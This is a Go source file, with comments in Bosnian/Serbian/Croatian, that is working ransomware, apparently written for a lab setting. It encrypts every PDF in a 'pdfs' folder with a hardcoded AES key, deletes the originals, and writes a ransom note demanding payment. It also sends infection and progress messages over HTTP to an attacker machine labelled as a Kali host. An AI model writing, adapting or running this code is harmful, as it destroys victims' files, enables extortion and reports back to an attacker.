package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "path/filepath"
    "strings"
    "time"
)

const aes_key = "12345678123456781234567812345678"
const kali_ip = "192.168.72.128" 

// Nova funkcija za slanje logova napadaču
func sendLog(message string) {
    // Kodujemo poruku da bi bila validna u URL adresi (razmaci itd.)
    encodedMsg := url.QueryEscape(message)
    url := fmt.Sprintf("http://%s:8080/log?msg=%s", kali_ip, encodedMsg)
    // Šaljemo u pozadini, da ne usporava enkripciju
    go http.Get(url)
}

func dropRansomNote(dirPath string) {
    noteContent := `
=============================================
VASI FAJLOVI SU ENKRIPTIRANI!
Svi vasi PDF dokumenti su sada nečitljivi.

Da biste povratili pristup, morate platiti otkupninu.
Kontaktirajte nas na: zli.haker@darkweb.onion
=============================================
`
    notePath := filepath.Join(dirPath, "RANSOM_NOTE.txt")
    err := os.WriteFile(notePath, []byte(noteContent), 0644)
    if err != nil {
        sendLog("Greska pri kreiranju ransom poruke!")
    } else {
        sendLog("Ransom poruka uspjesno kreirana.")
    }
}

func main() {
    path := "pdfs"
    
    // Javljamo serveru da je zaraza počela
    http.Get(fmt.Sprintf("http://%s:8080/infected", kali_ip))
    sendLog("Ransomware pokrenut na žrtvinom računaru!")

    encryptionCount := 0

    err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            sendLog(fmt.Sprintf("Error accesing path: %s", path))
            return err
        }
        if !info.IsDir() && strings.HasSuffix(info.Name(), ".pdf") {
            data, err := os.ReadFile(path)
            if err != nil {
                sendLog(fmt.Sprintf("Error reading file: %s", path))
                return err
            }

            file, err := os.Create(path + ".enc")
            if err != nil {
                sendLog(fmt.Sprintf("Greska pri kreiranju .enc: %s", path))
                return err
            }
            defer file.Close()

            aes_key_byted := []byte(aes_key)
            aes_key_cipher, _ := aes.NewCipher(aes_key_byted)
            gcm, err := cipher.NewGCM(aes_key_cipher)
            if err != nil {
                return err
            }
            nonce := make([]byte, gcm.NonceSize())
            _, err = io.ReadFull(rand.Reader, nonce)

            encrypted_data := gcm.Seal(nonce, nonce, data, nil)
            _, err = file.Write(encrypted_data)
            if err != nil {
                return err
            }
            err = os.Remove(path)
            if err != nil {
                return err
            }
            
            encryptionCount++
            // UMJESTO fmt.Println, ŠALJEMO KA KALIJU:
            sendLog(fmt.Sprintf("Enkriptiran: %s", info.Name()))
        }

        return err
    })

    if err != nil {
        sendLog("Greška prilikom šetnje kroz foldere.")
        return
    }

    if encryptionCount > 0 {
        dropRansomNote("pdfs")
        sendLog("Enkripcija zavrsena. Sistemi zarazeni.")
    } else {
        sendLog("Nije pronadjen nijedan PDF za enkripciju.")
    }
    time.Sleep(1*time.Second)
}